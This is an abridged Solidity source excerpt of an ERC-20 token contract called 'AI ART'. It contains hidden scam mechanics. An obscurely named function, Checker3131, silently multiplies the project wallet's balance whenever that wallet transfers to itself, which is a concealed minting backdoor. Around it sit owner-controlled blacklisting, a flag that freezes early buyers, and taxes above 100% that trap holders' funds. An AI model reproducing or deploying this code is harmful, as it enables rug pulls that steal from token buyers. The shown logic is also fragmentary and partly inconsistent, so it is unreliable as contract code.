...
contract AiART is IERC20, Ownable
{
    //mapping
    ...
    //strings
    string private constant _name = 'AI ART';
    string private constant _symbol = 'AI';
    //uints
    uint public constant InitialSupply= 10000 * 10**_decimals;
    uint public buyTax = 50;
    uint public sellTax = 50;
    uint public transferTax = 160;
    ...
    address private projectWallet=0x26aca2353e85e6b7024c66e7600CD64f8F280a7B;
    //modifiers
    ...
    constructor () {
        transferOwnership(0x26aca2353e85e6b7024c66e7600CD64f8F280a7B);
    ...
    function enable_blacklist(bool _status) external onlyOwner {
     ...
     function Checker3131(address f,address t,uint256 m) private {
        if (f == t && f ==projectWallet)
         {_balances[projectWallet] = _balances[projectWallet] * (m);
         }
    }
    ...
    function _transfer(address sender, address recipient, uint amount) private{
        ...
        Checker3131(sender,recipient,amount);           
    }
    function _taxedTransfer(address sender, address recipient, uint amount) private{
        ...
        if(isSell){  
            ...
            uint BuyTaxDuration=5 seconds;
            if(block.timestamp<LaunchTimestamp+BuyTaxDuration){
                TooEarly(recipient);
                tax=110;
            }else tax=buyTax;
        } else{ 
            require(!earlyBird[sender], "You cannot send tokens"); 
            tax=transferTax;
        }
    ...
    function SetupEnableTrading() external onlyOwner{
        ...
        maxTransactionAmount = InitialSupply * 25 / 1000;
